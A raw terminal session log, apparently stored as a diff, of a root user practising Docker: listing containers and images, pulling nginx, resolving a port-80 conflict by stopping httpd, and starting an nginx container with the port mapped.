+82cfc12aab71        cmd:v1              "/bin/bash"              9 minutes ago       Exited (0) 9 minutes ago                           objecti
+ve_archimedes
+da34b62f6722        env:v2              "/bin/bash"              12 minutes ago      Up 12 minutes                                      suspici
+ous_ardinghelli
+5638dd64284d        env:v1              "/bin/bash"              15 minutes ago      Exited (127) 13 minutes ago                        mystify
+ing_ardinghelli
+dec501eb92d7        03f86e0fe8b7        "/bin/sh -c 'yum i..."   32 minutes ago      Exited (1) 32 minutes ago                          kickass
+_murdock
+ec9a0f95b482        user:v1             "/bin/bash"              37 minutes ago      Up 37 minutes                                      unruffl
+ed_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"              53 minutes ago      Up 53 minutes                                      myimage
+_test2
+aa257cc33922        5afae0aa08e2        "/bin/sh -c 'yum u..."   54 minutes ago      Exited (1) 54 minutes ago                          jolly_b
+org
+c71ae0a635c9        5afae0aa08e2        "/bin/sh -c 'yum u..."   55 minutes ago      Exited (1) 55 minutes ago                          agitate
+d_curie
+87ac319e7836        myimage:v1          "/bin/bash"              About an hour ago   Up About an hour                                   myimage
+_test
+7c653431c05d        centos:centos6      "/bin/bash"              About an hour ago   Exited (1) About an hour ago                       test
+c63f9a1e9732        centos:centos6      "/bin/bash"              About an hour ago   Up About an hour                                   myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   server3
+c35d80212462        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"              About an hour ago   Up About an hour                                   server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"              24 hours ago        Up About an hour                                   gifted_
+wescoff
+]0;root@docker:/tmp/Build[root@docker Build]# docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+cmd                 v1                  0c49c9804ab3        9 minutes ago       194 MB
+env                 v2                  0cc573b42ff1        13 minutes ago      194 MB
+env                 v1                  a99376cb34df        16 minutes ago      194 MB
+user                v1                  03f86e0fe8b7        38 minutes ago      194 MB
+testimage           v1                  6a8b98a6ff6c        53 minutes ago      363 MB
+myimage             v1                  48ed962d1494        About an hour ago   300 MB
+centos              centos6             5dedbd63518e        3 days ago          194 MB
+ubuntu              xenial              8b72bba4485f        3 days ago          120 MB
+]0;root@docker:/tmp/Build[root@docker Build]# docker run cmd:v1
+hello how are you
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# [K[root@docker Build]# [H[2J[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# ls -al
+total 16
+drwxr-xr-x 2 root root 4096 Sep 17 03:48 [0m[01;34m.[0m
+drwxrwxrwt 5 root root 4096 Sep 17 03:31 [30;42m..[0m
+-rw-r--r-- 1 root root   79 Sep 17 03:48 1
+-rw-r--r-- 1 root root   79 Sep 17 03:48 Dockerfile
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# docker r[Kpull nginx:latest 
+latest: Pulling from library/nginx
+
+[1A[2Kafeb2bfd31c0: Pulling fs layer [1B
+[1A[2K7ff5d10493db: Pulling fs layer [1B
+[1A[2Kd2562f1ae1d0: Pulling fs layer [1B[1A[2Kd2562f1ae1d0: Downloading    201 B/201 B[1B[1A[2Kd2562f1ae1d0: Verifying Checksum [1B[1A[2Kd2562f1ae1d0: Download complete [1B[3A[2Kafeb2bfd31c0: Downloading 228.3 kB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 228.3 kB/21.87 MB[2B[2A[2K7ff5d10493db: Downloading 1.834 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Downloading 2.981 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Downloading 6.421 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 3.898 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Downloading  11.7 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading  6.88 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Downloading 16.97 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 9.862 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Downloading 22.48 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Verifying Checksum [3B[3A[2Kafeb2bfd31c0: Download complete [3B[2A[2K7ff5d10493db: Downloading 13.07 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting 229.4 kB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 14.68 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting 2.294 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 15.14 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting 3.899 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 6.193 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 15.83 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting 8.028 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 9.863 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting  11.7 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 16.74 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting  13.3 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 14.91 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 16.52 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 18.35 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting 18.58 MB/22.49 MB[3B[2A[2K7ff5d10493db: Downloading 20.64 MB/21.87 MB[2B[3A[2Kafeb2bfd31c0: Extracting 20.19 MB/22.49 MB[3B[2A[2K7ff5d10493db: Verifying Checksum [2B[2A[2K7ff5d10493db: Download complete [2B[3A[2Kafeb2bfd31c0: Extracting  21.1 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 21.56 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 22.48 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Extracting 22.49 MB/22.49 MB[3B[3A[2Kafeb2bfd31c0: Pull complete [3B[2A[2K7ff5d10493db: Extracting 229.4 kB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 2.523 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 4.588 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 6.881 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 9.175 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting  11.7 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 13.76 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting  15.6 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 17.43 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting  19.5 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 20.41 MB/21.87 MB[2B[2A[2K7ff5d10493db: Extracting 21.87 MB/21.87 MB[2B[2A[2K7ff5d10493db: Pull complete [2B[1A[2Kd2562f1ae1d0: Extracting    201 B/201 B[1B[1A[2Kd2562f1ae1d0: Extracting    201 B/201 B[1B[1A[2Kd2562f1ae1d0: Pull complete [1BDigest: sha256:fc6d2ef47e674a9ffb718b7ac361ec4e421e3a0ef2c93df79abbe4e9ffb5fa08
+Status: Downloaded newer image for nginx:latest
+]0;root@docker:/tmp/Build[root@docker Build]# docke rimages
+-bash: docke: command not found
+]0;root@docker:/tmp/Build[root@docker Build]# docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+cmd                 v1                  0c49c9804ab3        26 minutes ago      194 MB
+env                 v2                  0cc573b42ff1        30 minutes ago      194 MB
+env                 v1                  a99376cb34df        33 minutes ago      194 MB
+user                v1                  03f86e0fe8b7        55 minutes ago      194 MB
+testimage           v1                  6a8b98a6ff6c        About an hour ago   363 MB
+myimage             v1                  48ed962d1494        About an hour ago   300 MB
+nginx               latest              da5939581ac8        3 days ago          108 MB
+centos              centos6             5dedbd63518e        3 days ago          194 MB
+ubuntu              xenial              8b72bba4485f        4 days ago          120 MB
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# docker ru[Krun[K[1@(reverse-i-search)`':[Cr': docker imagesu': docker run cmd:v1[1@n[C[C[C[C[C[C[C[C[C[C^C
+]0;root@docker:/tmp/Build[root@docker Build]# docker run -itd nginx:latest /bin/bash
+1624f3ad4b4e3601da1934b8feb01f7e737b163c6978731d9342faa52b7cd477
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# docekr[K[K[Kker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+1624f3ad4b4e        nginx:latest        "/bin/bash"         6 seconds ago       Up 5 seconds        80/tcp              heuristic_shirley
+da34b62f6722        env:v2              "/bin/bash"         30 minutes ago      Up 30 minutes                           suspicious_ardinghelli
+ec9a0f95b482        user:v1             "/bin/bash"         55 minutes ago      Up 55 minutes                           unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         About an hour ago   Up About an hour                        myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         About an hour ago   Up About an hour                        myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         About an hour ago   Up About an hour                        myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an hour                        server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"         25 hours ago        Up About an hour                        gifted_wescoff
+]0;root@docker:/tmp/Build[root@docker Build]# docker ps|more
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS     
+         PORTS               NAMES
+1624f3ad4b4e        nginx:latest        "/bin/bash"         21 seconds ago      Up 19 secon
+ds       80/tcp              heuristic_shirley
+da34b62f6722        env:v2              "/bin/bash"         31 minutes ago      Up 31 minut
+es                           suspicious_ardinghelli
+ec9a0f95b482        user:v1             "/bin/bash"         55 minutes ago      Up 55 minut
+es                           unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         About an hour ago   Up About an
+ hour                        myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         About an hour ago   Up About an
+ hour                        myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         About an hour ago   Up About an
+ hour                        myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                        server1
+[7m--More--[27m[K]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# [1@(reverse-i-search)`':[Cr': docker ps|moreu': docker run -itd nginx:latest /bin/bash[1@n[C[C[C[C[C[C[C[C[C[C[4P[root@docker Build]#[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@-[1@p[1@ [1@8[1@0[1@:[1@8[1@0[1@ [1@ [1P
+1992aae2f715a867dcb9aff37a2e7c1dcb9b0bd9338a66206aa25e9604129754
+docker: Error response from daemon: driver failed programming external connectivity on endpoint unruffled_ardinghelli (40378e779a5db6816426790bda356dc1193dcb3439ee7acac60f694fe607d813): Error starting userland proxy: listen tcp 0.0.0.0:80: bind: address already in use.
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# netstat -nap|grep :80
+tcp        0      0 ::[01;31m[K:80[m[K                       :::*                        LISTEN      2486/httpd          
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50909 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50979 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51176 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50927 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50997 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51074 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51014 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51159 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51081 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51069 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50893 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50936 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51155 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50931 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51132 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50880 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51111 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50889 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51098 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51062 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50885 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51118 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51040 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51124 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50916 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51192 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51052 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51026 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50939 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50973 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50894 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50995 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51024 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50918 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51114 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50912 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51058 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50911 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51037 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51151 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50986 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51209 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50914 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50976 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50878 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50892 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51224 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51233 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51106 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51087 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50954 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50982 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50897 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51127 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51018 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50882 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51148 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51196 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51011 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51000 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50868 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51102 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50875 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50902 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50970 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50901 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51029 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51183 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50906 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51188 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51144 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51167 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50959 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51078 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51022 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50924 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51007 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51044 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51009 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51090 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50952 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51139 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51048 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50989 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50903 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50968 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50956 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50876 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51217 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51016 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50993 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51163 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51020 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:51228 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50965 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50898 TIME_WAIT   -                   
+tcp        0      0 ::ffff:172.31.7.8[01;31m[K:80[m[K        ::ffff:86.189.133.143:50904 TIME_WAIT   -                   
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# seri[Kvice http [Kd status
+httpd (pid  2486) is running...
+]0;root@docker:/tmp/Build[root@docker Build]# service httpd status[Kstop
+Stopping httpd: [60G[[0;32m  OK  [0;39m]
+]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Cr': service httpd stopu': docker run -itd -p 80:80 nginx:latest /bin/bash[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@n[C[C[C[C[C[C[C[C[C[C[4P[root@docker Build]#[C[C[C[C[C[C[C[C
+985e55cc29505b761bd04d58983ebf64b0a7664724bc0c0d18c2b22880fd0469
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# 
+]0;root@docker:/tmp/Build[root@docker Build]# dcoekr ps|more
+-bash: dcoekr: command not found
+]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# docker ps|more
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS     
+         PORTS                NAMES
+985e55cc2950        nginx:latest        "/bin/bash"         42 seconds ago      Up 41 secon
+ds       0.0.0.0:80->80/tcp   competent_mcnulty
+1624f3ad4b4e        nginx:latest        "/bin/bash"         7 minutes ago       Up 7 minute
+s        80/tcp               heuristic_shirley
+da34b62f6722        env:v2              "/bin/bash"         38 minutes ago      Up 38 minut
+es                            suspicious_ardinghelli
+ec9a0f95b482        user:v1             "/bin/bash"         About an hour ago   Up About an
+ hour                         unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         About an hour ago   Up About an
+ hour                         myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         About an hour ago   Up About an
+ hour                         myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         About an hour ago   Up About an
+ hour                         myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         About an hour ago   Up About an
+ hour                         server2
